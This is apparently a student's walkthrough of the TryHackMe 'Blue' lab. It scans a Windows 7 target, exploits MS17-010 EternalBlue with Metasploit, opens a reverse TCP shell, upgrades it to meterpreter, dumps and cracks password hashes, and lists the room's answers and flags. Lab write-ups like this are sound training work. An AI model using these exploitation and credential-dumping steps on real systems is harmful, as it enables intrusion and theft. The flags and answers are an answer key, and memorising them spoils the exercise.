# Blue_THM

- We start the machine and get the IP → `10.201.76.28`
- Let’s scan the machine
- Nmap report
    
    ```json
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 12:03 IST
    Nmap scan report for 10.201.76.28
    Host is up (0.34s latency).
    Not shown: 991 closed tcp ports (reset)
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    3389/tcp  open  tcpwrapped
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49158/tcp open  msrpc        Microsoft Windows RPC
    49160/tcp open  msrpc        Microsoft Windows RPC
    Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 83.68 seconds
    
    ```
    
- q1 → How many ports are open with a port number under 1000?
    - Solution → 3
- For checking which vuln is persent on the machine , we use metasploit.
- we check for the eternal_blue vulnerability
- This specific exploit
    - We get this data using the `info` command on the context
    
    ```json
           Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
         Module: exploit/windows/smb/ms17_010_eternalblue
       Platform: Windows
           Arch: x64
     Privileged: Yes
        License: Metasploit Framework License (BSD)
           Rank: Average
      Disclosed: 2017-03-14
    
    ```
    
- `check` command checks whether this exploit will work against it.
    - Results
        
        ```json
        [*] 10.201.76.28:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
        [+] 10.201.76.28:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
        /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
        [*] 10.201.76.28:445      - Scanned 1 of 1 hosts (100% complete)
        [+] 10.201.76.28:445 - The target is vulnerable.
        ```
        
- This shows that the target is vulnerable.
- q2 → What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) ?
    - Solution → ms17-010

- q2 → Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
    - Solution → exploit/windows/smb/ms17_010_eternalblue
- using the command `set rhosts`
- q2 →Show options and set the one required value. What is the name of this value? (All caps for submission)
    - Solution → rhosts
- I used the command `sessions -u <session id>` but you can use this also.
- q2 →If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
    - Solution → post/multi/manage/shell_to_meterpreter
- q2 →Select this (use MODULE_PATH). Show options, what option are we required to change?
    - Solution → session
- `hashdump` command when used in the meterpreter shell gives us the name along with the hash.
- q2 →What is the name of the non-default user?
    - Solution → Jon
- Using [crackstation.net](http://crackstation.net) I cracked the hash which resulted in the password.
- q2 →Copy this password hash to a file and research how to crack it. What is the cracked password?
    - Solution → alqfna22
- 
- Let’s set the payload and run the exploit.
- One more thing that, before running the exploit make sure to set the required options according to needs. i.e. setting the rhosts option to the machine IP.
- Now, we set the payload to `set payload windows/x64/shell/reverse_tcp`
- Let’s run the exploit now.
- Very important step is that, you have to set the lhost option to your thm(tryhackme) IP
- We got a  windows shell, Now we need to upgrade the shell in metasploit.
- We can see the current sessions using the `sessions` command.
    
    ![VirtualBoxVM_BCTEFGypFW.png](Blue_THM%202793c5d54c7680aaaf05e10dd2d373f0/VirtualBoxVM_BCTEFGypFW.png)
    
- Upgrading the shell we see the meterpreter prompt
    
    ![VirtualBoxVM_fspZXq3DAG.png](Blue_THM%202793c5d54c7680aaaf05e10dd2d373f0/VirtualBoxVM_fspZXq3DAG.png)
    
- Now we get a fully functioning meterpreter shell
- Now we migrate to a elevated process by using migrate to any process thats running as admin
- Simply check the pids with the command `ps`  and the then do `migrate <pid>` to migrate to that process. This might need some trial and errors.
- Now we get the first flag in the c:// directory.
- q2 →Flag1? *This flag can be found at the system root.*
    - Solution → flag{access_the_machine}
- Next we get the hint  for the next flag which is that the folder where passwords are stored. After a little google seaarch we find this → `C:\\Windows\\System32\\config` directory.
- q2 →Flag2? *This flag can be found at the location where passwords are stored within Windows.*
    - Solution → **flag{sam_database_elevated_access}
- Finally the last flag can be found in the Jon/documents folder.
- q2 → flag3? *This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.*
    - Solution →  **flag{admin_documents_can_be_valuable}